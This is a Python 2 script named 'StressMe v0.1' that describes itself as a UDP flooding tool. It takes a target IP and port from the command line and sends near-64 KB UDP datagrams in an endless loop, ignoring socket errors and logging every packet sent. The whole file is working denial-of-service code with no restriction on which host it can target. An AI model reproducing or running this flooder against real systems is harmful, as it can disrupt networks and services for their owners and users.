#!/usr/bin/env python
# -*- coding: utf-8 -*-
from twisted.internet.protocol import DatagramProtocol
from twisted.internet import reactor
import socket, sys, random, string, argparse, math

host = "10.0.0.0"
port = 1234
str_size = 20
numb_size = 10
str_array = []
numb_array = []
debug = False

banner = """
---------------------------------------------------
   _____ _                     __  __                 
 / ____| |                   |  \/  |               
| (___ | |_ _ __ ___  ___ ___| \  / | ___           
 \___ \| __| '__/ _ \/ __/ __| |\/| |/ _ \          
 ____) | |_| | |  __/\__ \__ \ |  | |  __/          
|_____/ \__|_|  \___||___/___/_|  |_|\___|          
                                                    
--------------------------------------------------- 
Program: StressMe v0.1                              
Author:  Rodrigo E. Quintanilla                     
---------------------------------------------------
"""


def convertToHuman(size_bytes):
   if size_bytes == 0:
       return "0 B"
   size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size_bytes, 1024)))
   p = math.pow(1024, i)
   s = round(size_bytes / p, 2)
   return "%s %s" % (s, size_name[i])


def paramParser():
    global host, port

    parser = argparse.ArgumentParser(description='UDP Flooding tool')
    parser.add_argument('-i', '--ip', required=True, help='Destination IP to send packets', )
    parser.add_argument('-p', '--port', type=int, default=1234, help='Port to send packets (default: 1234)')
    args = vars(parser.parse_args())
    host = args["ip"]
    port = args["port"]


def createStringArray(size):
   return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(size))


def createNumberArray(size):
    return random.sample(range(60000, 65500), size)

class flooder(DatagramProtocol):

    def startProtocol(self):
        packet_counter = 0

        # Creates the conector to the destination host
        self.transport.connect(host, port)

        while True:
            try:
                string = random.choice(str_array)
                pckt_size = random.choice(numb_array)
                self.transport.write(string*pckt_size) # no need for address
                sys.stdout.write("[INFO] Packet number " + str(packet_counter) + " (" + convertToHuman(pckt_size) + ") \r\n")
                packet_counter += 1
            except socket.error as e:
                pass


    def datagramReceived(self, data, (host, port)):
        print "[INFO] Received %r from %s:%d" % (data, host, port)

    # Possibly invoked if there is no server listening on the
    # address to which we are sending.
    def connectionRefused(self):
        print "[INFO] No port listening"


def main():
    print banner
    global numb_array, str_array

    try:
        paramParser()
        str_array = createStringArray(str_size)
        numb_array = createNumberArray(numb_size)

        # 0 means any port, we don't care in this case
        reactor.listenUDP(0, flooder())
        reactor.run()
    except KeyboardInterrupt:
        print "[INFO] Thank you for using me. See you soon. BYE!! :)"


if __name__ == "__main__":
    main()